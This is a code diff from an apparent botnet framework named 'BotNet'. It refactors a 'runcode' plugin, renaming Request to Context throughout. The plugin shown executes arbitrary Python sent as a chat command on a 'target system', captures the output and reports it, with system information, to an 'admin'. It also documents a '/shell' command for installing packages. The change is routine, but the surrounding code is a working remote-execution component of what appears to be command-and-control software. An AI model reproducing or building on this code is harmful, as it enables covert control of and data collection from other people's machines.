@@ -2,11 +2,11 @@ import sys
 import time
 import threading
 import traceback
-from .. import BotNet, Request, UserException
+from .. import BotNet, Context, UserException
 
 
 @BotNet.default_script(script_version="0.0.1")
-def runcode(request: Request) -> str:
+def runcode(context: Context) -> str:
     """run python code on target system and return stdout
     syntax:
     `/runcode CODE`
@@ -27,10 +27,10 @@ def runcode(request: Request) -> str:
     example install library:
         `/shell pip install requests`
     """
-    if len(request.command) > 0:
-        code = " ".join(request.command)
+    if len(context.command) > 0:
+        code = " ".join(context.command)
         # run code in thread to avoid blocking main thread
-        thread = threading.Thread(target=exec_code, args=(request, code))
+        thread = threading.Thread(target=exec_code, args=(context, code))
         thread.start()
         for _ in range(40):
             # wait for thread to finish
@@ -44,7 +44,7 @@ def runcode(request: Request) -> str:
         raise UserException("Please enter your code.")
 
 
-def exec_code(request: Request, code: str):
+def exec_code(context: Context, code: str):
     """execute python code and send stdout/stderr to admin"""
 
     def NewPrint(*value, sep=" ", end="\n", file=sys.stdout, flush=False):
@@ -73,7 +73,7 @@ ________result:
 ________Executed Code:
 {code}"""
 
-    request.engine.send(
+    context.engine.send(
         res,
-        additionalـinfo=request.system_info(minimal=True),
+        additionalـinfo=context.system_info(minimal=True),
     )
